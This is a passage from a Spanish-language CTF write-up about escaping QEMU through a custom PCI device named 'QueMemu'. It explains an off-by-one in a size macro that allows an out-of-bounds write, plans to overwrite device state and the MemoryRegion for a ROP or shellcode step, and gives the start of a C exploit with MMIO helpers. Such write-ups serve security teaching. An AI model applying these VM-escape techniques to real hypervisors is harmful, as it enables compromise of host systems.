+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk9 mtki">quememu</span><span class="mtk1">-&gt;</span><span class="mtk1">state</span><span class="mtk1">.</span><span class="mtk1">base</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">) { </span>
+<span class="mtk1">    </span><span class="mtk8">cpu_physical_memory_rw</span><span class="mtk1">(</span><span class="mtk9 mtki">quememu</span><span class="mtk1">-&gt;</span><span class="mtk1">state</span><span class="mtk1">.</span><span class="mtk1">src</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk9 mtki">quememu</span><span class="mtk1">-&gt;</span><span class="mtk1">buff</span><span class="mtk1">[</span><span class="mtk9 mtki">quememu</span><span class="mtk1">-&gt;</span><span class="mtk1">state</span><span class="mtk1">.</span><span class="mtk1">off</span><span class="mtk1">], </span><span class="mtk8">MAX_RW</span><span class="mtk1">, </span><span class="mtk9 mtki">is_write</span><span class="mtk1">);</span>  
+<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1">;</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  </span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">short</span><span class="mtk1"> </span><span class="mtk1">n</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">quememu</span><span class="mtk1">-&gt;</span><span class="mtk1">state</span><span class="mtk1">.</span><span class="mtk1">off</span><span class="mtk1">;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk1">multiplier</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk1">new_off</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+
+<span class="mtk1">  </span><span class="mtk5">for</span><span class="mtk1"> (</span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk5">sizeof</span><span class="mtk1">(</span><span class="mtk1">n</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">; </span><span class="mtk5">++</span><span class="mtk1">i</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk3">// Use nibble % base (e.g. 7 in base 3 = 1)</span>
+<span class="mtk1">    </span><span class="mtk1">new_off</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> (</span><span class="mtk8">consume_nibble</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">n</span><span class="mtk1">) </span><span class="mtk5">%</span><span class="mtk1"> </span><span class="mtk9 mtki">quememu</span><span class="mtk1">-&gt;</span><span class="mtk1">state</span><span class="mtk1">.</span><span class="mtk1">base</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk1">multiplier</span><span class="mtk1">; </span>
+<span class="mtk1">    </span><span class="mtk1">multiplier</span><span class="mtk1"> </span><span class="mtk5">*=</span><span class="mtk1"> </span><span class="mtk9 mtki">quememu</span><span class="mtk1">-&gt;</span><span class="mtk1">state</span><span class="mtk1">.</span><span class="mtk1">base</span><span class="mtk1">;</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  </span><span class="mtk8">cpu_physical_memory_rw</span><span class="mtk1">(</span><span class="mtk9 mtki">quememu</span><span class="mtk1">-&gt;</span><span class="mtk1">state</span><span class="mtk1">.</span><span class="mtk1">src</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk9 mtki">quememu</span><span class="mtk1">-&gt;</span><span class="mtk1">buff</span><span class="mtk1">[</span><span class="mtk1">new_off</span><span class="mtk1">], </span><span class="mtk8">MAX_RW</span><span class="mtk1">, </span><span class="mtk9 mtki">is_write</span><span class="mtk1">);</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Y la función <code>consume_nibble</code> devuelve los 4 bits menos significativos del número que recibe y desplaza el mismo número 4 bits a la derecha:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk8">consume_nibble</span><span class="mtk1">(</span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">short</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk9 mtki">n</span><span class="mtk1">) {</span>  
+<span class="mtk1">  </span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk1">nibble</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">n </span><span class="mtk5">&lt;&lt;</span><span class="mtk1"> </span><span class="mtk6">4</span><span class="mtk1">;</span>
+<span class="mtk1">  </span><span class="mtk1">nibble</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">nibble</span><span class="mtk1"> </span><span class="mtk5">&gt;</span><span class="mtk1"> </span><span class="mtk5">&gt;</span><span class="mtk6">4</span><span class="mtk1">;</span>
+<span class="mtk1">  </span><span class="mtk5">*</span><span class="mtk1">n </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">n </span><span class="mtk5">&gt;&gt;</span><span class="mtk1"> </span><span class="mtk6">4</span><span class="mtk1">;</span>
+
+<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">nibble</span><span class="mtk1">;</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Es importante también mirar las constantes y las definiciones de tipos:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">#define</span><span class="mtk1"> </span><span class="mtk8">TYPE_PCI_QUEMEMU_DEVICE</span><span class="mtk1"> </span><span class="mtk4">"quememu"</span>
+<span class="mtk5">#define</span><span class="mtk1"> </span><span class="mtk8">QUEMEMU_MMIO_SIZE</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">10000</span>
+<span class="mtk5">#define</span><span class="mtk1"> </span><span class="mtk8">BUFF_SIZE</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">10000</span>
+<span class="mtk5">#define</span><span class="mtk1"> </span><span class="mtk8">MAX_BASE</span><span class="mtk1"> </span><span class="mtk6">20</span>
+<span class="mtk5">#define</span><span class="mtk1"> </span><span class="mtk8">MAX_RW</span><span class="mtk1"> </span><span class="mtk8">BUFF_SIZE</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> (</span><span class="mtk8">pow</span><span class="mtk1">(</span><span class="mtk8">MAX_BASE</span><span class="mtk1">, </span><span class="mtk6">3</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">7</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk8">pow</span><span class="mtk1">(</span><span class="mtk8">MAX_BASE</span><span class="mtk1">, </span><span class="mtk6">2</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">F</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk8">MAX_BASE</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">F</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">F</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">)</span>  
+
+<span class="mtk5">typedef</span><span class="mtk1"> </span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk8 mtku">base_t</span><span class="mtk1">;</span>
+</code></pre></div><p>Una línea sospechosa es la siguiente:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">#define</span><span class="mtk1"> </span><span class="mtk8">MAX_RW</span><span class="mtk1"> </span><span class="mtk8">BUFF_SIZE</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> (</span><span class="mtk8">pow</span><span class="mtk1">(</span><span class="mtk8">MAX_BASE</span><span class="mtk1">, </span><span class="mtk6">3</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">7</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk8">pow</span><span class="mtk1">(</span><span class="mtk8">MAX_BASE</span><span class="mtk1">, </span><span class="mtk6">2</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">F</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk8">MAX_BASE</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">F</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">F</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">)</span>  
+</code></pre></div><p>Es una expresión rara, porque podrían haber puesto simplemente el resultado de la operación. Si nos fijamos bien, el valor que hay en <code>MAX_RW</code> es:</p><p class="scroll">$$
+\mathtt{MAX\_RW} = \mathtt{BUFF\_SIZE} - (\mathtt{0x7} \cdot 20^3 + \mathtt{0xF} \cdot 20^2 + \mathtt{0xF} \cdot 20^1 + \mathtt{0xF} \cdot 20^0 - 1)
+$$</p><p>Este número se corresponde con <code>0x7FFE</code> en base <code>20</code>. Esto de la base numérica es algo particular de este reto, ya que nos deja configurar el <em>offset</em> en el que escribir en función de una base.</p><h3 id="vulnerabilidad">Vulnerabilidad</h3><p>Sin embargo, la vulnerabilidad de este dispositivo está en el término $-1$ de la expresión anterior. El hecho es que el máximo <em>offset</em> que podemos poner es <code>0x7fff</code> (en hexadecimal), ya que el atributo <code>off</code> es de tipo <code>short</code> (con signo) y se verifica que sea un número positivo:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">08</span><span class="mtk1">:</span>
+<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> ((</span><span class="mtk7 mtki">short</span><span class="mtk1">) </span><span class="mtk9 mtki">val</span><span class="mtk1"> </span><span class="mtk5">&gt;=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk1">quememu</span><span class="mtk1">-&gt;</span><span class="mtk1">state</span><span class="mtk1">.</span><span class="mtk1">off</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">val</span><span class="mtk1">;</span>  
+<span class="mtk1">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
+</code></pre></div><p>Pero si usamos base <code>20</code> (que es la máxima que nos permiten), entonces el nuevo <em>offset</em> será:</p><p class="scroll">$$
+\mathtt{new\_off} = \mathtt{0x7} \cdot 20^3 + \mathtt{0xF} \cdot 20^2 + \mathtt{0xF} \cdot 20^1 + \mathtt{0xF} \cdot 20^0
+$$</p><p>Y así, tenemos: $\mathtt{MAX\_RW} = \mathtt{BUFF\_SIZE} - (\mathtt{new\_off} - 1)$ y por tanto $\mathtt{new\_off} = \mathtt{BUFF\_SIZE} - \mathtt{MAX\_RW} + 1$.</p><p>Con este nuevo <em>offset</em>, si escribimos, estaremos escribiendo desde $\mathtt{new\_off}$ hasta $\mathtt{new\_off} + \mathtt{MAX\_RW}$, es decir, hasta $\mathtt{BUFF\_SIZE} + 1$. Y aquí tenemos un <em>out-of-bounds</em> (OOB).</p><p>En realidad, es un OOB para lectura y escritura, pero para lectura no es interesante. En cambio, el OOB de escritura nos da el poder de cambiar el atributo <code>base</code> sin ninguna limitación. Esto ocurre porque el atributo <code>base</code> se encuentra justo después de <code>buff</code> en la estructura:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">typedef</span><span class="mtk1"> </span><span class="mtk7 mtki">struct</span><span class="mtk1"> {</span>
+<span class="mtk1">  PCIDevice </span><span class="mtk1">pdev</span><span class="mtk1">;</span>
+<span class="mtk1">  MemoryRegion </span><span class="mtk1">mmio</span><span class="mtk1">;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk1">buff</span><span class="mtk1">[</span><span class="mtk8">BUFF_SIZE</span><span class="mtk1">];</span>  
+<span class="mtk1">  </span><span class="mtk7 mtki">struct</span><span class="mtk1"> {</span>
+<span class="mtk1">    </span><span class="mtk8 mtku">base_t</span><span class="mtk1"> </span><span class="mtk1">base</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk7 mtki">short</span><span class="mtk1"> </span><span class="mtk1">off</span><span class="mtk1">;</span>
+<span class="mtk1">    hwaddr </span><span class="mtk1">src</span><span class="mtk1">; </span>
+<span class="mtk1">  } </span><span class="mtk1">state</span><span class="mtk1">;</span>
+<span class="mtk1">} </span><span class="mtk8 mtku">QueMemuState</span><span class="mtk1">;</span>
+</code></pre></div><h2 id="estrategia-de-explotación">Estrategia de explotación</h2><p>Una vez que podamos cambiar el atributo <code>base</code> a cualquier valor, podremos conseguir un OOB mucho mayor. Por ejemplo, si ponemos la base a <code>21</code> y <code>off</code> a <code>0x7fff</code>, el nuevo <em>offset</em> será</p><p class="scroll">$$
+\mathtt{0x1185c} = \mathtt{0x7} \cdot 21^3 + \mathtt{0xF} \cdot 21^2 + \mathtt{0xF} \cdot 21^1 + \mathtt{0xF} \cdot 21^0
+$$</p><p>Evidentemente, este <em>offset</em> no nos sirve de mucho, porque nos pasamos en exceso de los límites. Pero podríamos pensar cuál es nuestro objetivo y luego definir el <em>offset</em> más adecuado para ello.</p><p>Al revisar otros retos de <code>qemu</code> <em>escape</em> como <a href="https://github.com/nobodyisnobody/write-ups/tree/main/Hitcon.Quals.2023/pwn/Full.Chain.-.Wall.Maria">Full Chain - Wall Maria</a> del HITCON CTF 2023, vemos que un buen objetivo es la estructura <code>MemoryRegion</code> en el atributo <code>mmio</code>. La diferencia entre este reto y <a href="https://github.com/nobodyisnobody/write-ups/tree/main/Hitcon.Quals.2023/pwn/Full.Chain.-.Wall.Maria">Full Chain - Wall Maria</a> es que la posición de <code>mmio</code> en la estructura del dispositivo cambia. En este caso, <code>mmio</code> se encuentra encima de <code>buff</code>, por lo que para poder modificarla necesitamos que <code>off</code> sea un número negativo.</p><p>Entonces, el mínimo OOB que necesitamos es simplemente de 2 bytes más de los que tenemos sin hacer ninguna modificación. Podemos buscar cuál es el valor que necesitamos usando Python:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; BUFF_SIZE = 0x10000
+&gt;&gt;&gt; MAX_BASE = 20
+&gt;&gt;&gt; MAX_RW = BUFF_SIZE - (pow(MAX_BASE,3)*0x7 + pow(MAX_BASE,2)*0xF + MAX_BASE*0xF + 0xF - 1)  
+3222
+&gt;&gt;&gt; b = 20
+&gt;&gt;&gt; hex(0x7 * b ** 3 + 0xf * b ** 2 + 0xf * b ** 1 + 0xf * b ** 0 + MAX_RW)
+'0x10001'
+&gt;&gt;&gt;
+&gt;&gt;&gt; b = 21
+&gt;&gt;&gt; hex(0x6 * b ** 3 + 0xf * b ** 2 + 0x6 * b ** 1 + 0xa * b ** 0 + MAX_RW)
+'0x10003'
+</code></pre></div><p>Vale, pues el valor <code>0x6f6a</code> en base <code>21</code> nos va a permitir un OOB de 3 bytes, lo justo para pisar los campos <code>base</code> (1 byte) y <code>off</code> (2 bytes).</p><p>Una vez que consigamos leer/escribir en <code>mmio</code>, ya es más o menos sencillo seguir. Podremos obtener direcciones de memoria de <code>qemu</code> y escribir una cadena ROP o un puntero a un <em>shellcode</em> en una tabla de funciones para leer la <em>flag</em>.</p><h3 id="aclaraciones">Aclaraciones</h3><p>Antes de comenzar a escribir, es necesario comprender ciertos conceptos:</p><ul><li><p>En primer lugar, para comunicarnos con el dispositivo PCI mediante MMIO, crearemos una región de memoria con <code>mmap</code> que irá vinculada al dispositivo. De esta manera, cada vez que leamos/escribamos, el dispositivo realizará una acción determinada</p></li><li><p>Por otro lado, el atributo <code>buff</code> que utiliza el dispositivo PCI se corresponde con una dirección de memoria física. Debemos encontrar una dirección de memoria virtual que coincida con esta dirección física, de manera que podamos utilizar el <em>buffer</em> del dispositivo</p></li><li><p>Para abrir el dispositivo, podemos lanzar <code>qemu</code> y listar dispositivos PCI. Con esto, buscamos el que queremos explotar mirando los identificadores que aparecen en el código fuente:</p></li></ul><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">   ___             __  __
+  / _ \ _   _  ___|  \/  | ___ _ __ ___  _   _
+ | | | | | | |/ _ \ |\/| |/ _ \ '_ ` _ \| | | |
+ | |_| | |_| |  __/ |  | |  __/ | | | | | |_| |
+  \__\_\\__,_|\___|_|  |_|\___|_| |_| |_|\__,_|
+
+-------------------------------------------------
+[+]          By DiegoAltF4 and Dbd4           [+]
+-------------------------------------------------
+
+/root # lspci
+00:01.0 Class 0601: 8086:7000
+00:04.0 Class 00ff: 1234:face
+00:00.0 Class 0600: 8086:1237
+00:01.3 Class 0680: 8086:7113
+00:03.0 Class 0200: 8086:100e
+00:01.1 Class 0101: 8086:7010
+00:02.0 Class 0300: 1234:1111
+/root # cat /sys/devices/pci0000:00/0000:00:04.0/device
+0xface
+/root # ls /sys/devices/pci0000:00/0000:00:04.0/
+ari_enabled               irq                       resource
+broken_parity_status      <span class="code-blue">link</span>                      resource0
+class                     local_cpulist             revision
+config                    local_cpus                <span class="code-cyan">subsystem</span>
+consistent_dma_mask_bits  modalias                  subsystem_device
+d3cold_allowed            msi_bus                   subsystem_vendor
+device                    numa_node                 uevent
+dma_mask_bits             <span class="code-blue">power</span>                     vendor
+driver_override           power_state               waiting_for_supplier  
+enable                    remove
+<span class="code-cyan">firmware_node</span>             rescan
+</code></pre></div><p>El archivo que usaremos en el <em>exploit</em> es <code>resource0</code>.</p><ul><li>El programa que tenemos que explotar es <code>qemu</code>. Por tanto, para depurar, podemos emplear dos puntos de vista: el propio <code>qemu</code> y el <em>exploit</em> que estará dentro de <code>qemu</code></li></ul><h2 id="desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></h2><p>Para comenzar, escribiremos las siguientes funciones auxiliares:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">uint8_t</span><span class="mtk5">*</span><span class="mtk1"> mmio_mem;</span>
+
+
+<span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">mmio_write</span><span class="mtk1">(</span><span class="mtk7 mtki">uint32_t</span><span class="mtk1"> </span><span class="mtk9 mtki">addr</span><span class="mtk1">, </span><span class="mtk7 mtki">uint32_t</span><span class="mtk1"> </span><span class="mtk9 mtki">value</span><span class="mtk1">) {</span>  
+<span class="mtk1">  </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">uint32_t</span><span class="mtk5">*</span><span class="mtk1">) (mmio_mem </span><span class="mtk5">+</span><span class="mtk1"> addr) </span><span class="mtk5">=</span><span class="mtk1"> value;</span>
+<span class="mtk1">}</span>
+
+<span class="mtk7 mtki">uint32_t</span><span class="mtk1"> </span><span class="mtk8">mmio_read</span><span class="mtk1">(</span><span class="mtk7 mtki">uint32_t</span><span class="mtk1"> </span><span class="mtk9 mtki">addr</span><span class="mtk1">) {</span>
+<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">uint32_t</span><span class="mtk5">*</span><span class="mtk1">) (mmio_mem </span><span class="mtk5">+</span><span class="mtk1"> addr);</span>
+<span class="mtk1">}</span>
+
+<span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">set_buff</span><span class="mtk1">() {</span>
+<span class="mtk1">  </span><span class="mtk8">mmio_write</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">00</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">);</span>
+<span class="mtk1">}</span>
+
+<span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">set_base</span><span class="mtk1">(</span><span class="mtk7 mtki">uint32_t</span><span class="mtk1"> </span><span class="mtk9 mtki">src</span><span class="mtk1">) {</span>
+<span class="mtk1">  </span><span class="mtk8">mmio_write</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">4</span><span class="mtk1">, src);</span>
+<span class="mtk1">}</span>
+
+<span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">set_off</span><span class="mtk1">(</span><span class="mtk7 mtki">uint32_t</span><span class="mtk1"> </span><span class="mtk9 mtki">off</span><span class="mtk1">) {</span>
+<span class="mtk1">  </span><span class="mtk8">mmio_write</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">8</span><span class="mtk1">, off);</span>
+<span class="mtk1">}</span>
+
+<span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">set_src</span><span class="mtk1">(</span><span class="mtk7 mtki">uint32_t</span><span class="mtk1"> </span><span class="mtk9 mtki">base</span><span class="mtk1">) {</span>
+<span class="mtk1">  </span><span class="mtk8">mmio_write</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">c</span><span class="mtk1">, base);</span>
+<span class="mtk1">}</span>
+
+<span class="mtk7 mtki">uint32_t</span><span class="mtk1"> </span><span class="mtk8">get_buff</span><span class="mtk1">() {</span>
+<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">mmio_read</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">0</span><span class="mtk1">);</span>
+<span class="mtk1">}</span>
+
+<span class="mtk7 mtki">uint32_t</span><span class="mtk1"> </span><span class="mtk8">get_base</span><span class="mtk1">() {</span>
+<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">mmio_read</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">4</span><span class="mtk1">);</span>
+<span class="mtk1">}</span>
+
+<span class="mtk7 mtki">uint32_t</span><span class="mtk1"> </span><span class="mtk8">get_off</span><span class="mtk1">() {</span>
+<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">mmio_read</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">8</span><span class="mtk1">);</span>
+<span class="mtk1">}</span>
+
+<span class="mtk7 mtki">uint32_t</span><span class="mtk1"> </span><span class="mtk8">get_src</span><span class="mtk1">() {</span>
+<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">mmio_read</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">c</span><span class="mtk1">);</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Estas funciones nos permiten leer y escribir atributos de la estructura del dispositivo PCI. Puede parecer extraño cómo funcionan <code>mmio_read</code> y <code>mmio_write</code>. La clave es que al realizar una operación de escritura en <code>mmio_mem</code>, el propio dispositivo PCI &ldquo;se dará cuenta&rdquo; y ejecutará la función correspondiente. Y si leemos en <code>mmio_mem</code>, se ejecutará otra función del dispositivo.</p><h3 id="interacción-con-el-dispositivo-pci">Interacción con el dispositivo PCI</h3><p>Para abrir el dispositivo y configurar la región de memoria <code>mmio_mem</code>, podemos hacer lo siguiente:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">() {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> mmio_fd </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">open</span><span class="mtk1">(</span><span class="mtk4">"/sys/devices/pci0000:00/0000:00:04.0/resource0"</span><span class="mtk1">, O_RDWR </span><span class="mtk5">|</span><span class="mtk1"> O_SYNC);</span>  
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (mmio_fd </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk8">fprintf</span><span class="mtk1">(stderr, </span><span class="mtk4">"[!] Cannot open device</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  mmio_mem </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">mmap</span><span class="mtk1">(</span><span class="mtk6">NULL</span><span class="mtk1">, </span><span class="mtk6">4</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> PAGE_SIZE, PROT_READ </span><span class="mtk5">|</span><span class="mtk1"> PROT_WRITE, MAP_SHARED, mmio_fd, </span><span class="mtk6">0</span><span class="mtk1">);</span>
+<span class="mtk1">  </span>
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (mmio_mem </span><span class="mtk5">==</span><span class="mtk1"> MAP_FAILED) {</span>
+<span class="mtk1">    </span><span class="mtk8">fprintf</span><span class="mtk1">(stderr, </span><span class="mtk4">"[!] mmio error</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
+<span class="mtk1">  }</span>
+</code></pre></div><p>Y para ver que efectivamente estamos interactuando con el dispositivo, podemos hacer las siguientes pruebas:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">  </span><span class="mtk8">set_off</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">);</span>
+<span class="mtk1">  </span><span class="mtk8">set_base</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">);</span>
+
+<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"[*] buff    ==&gt; </span><span class="mtk6">%x</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk8">get_buff</span><span class="mtk1">());</span>
+<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"[*] base    ==&gt; </span><span class="mtk6">%d</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk8">get_base</span><span class="mtk1">());</span>
+<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"[*] off     ==&gt; 0x</span><span class="mtk6">%hx</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk8">get_off</span><span class="mtk1">());</span>
+<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"[*] src     ==&gt; </span><span class="mtk6">%x</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk8">get_src</span><span class="mtk1">());</span>
+<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"[*] default ==&gt; 0x</span><span class="mtk6">%x</span><span class="mtk6">\n\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk8">mmio_read</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">));</span>  
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">sh</span> <span class="mtku">go.sh</span> <span class="mtku">exploit.c</span>
+...
+
+Booting from ROM..
+   ___             __  __
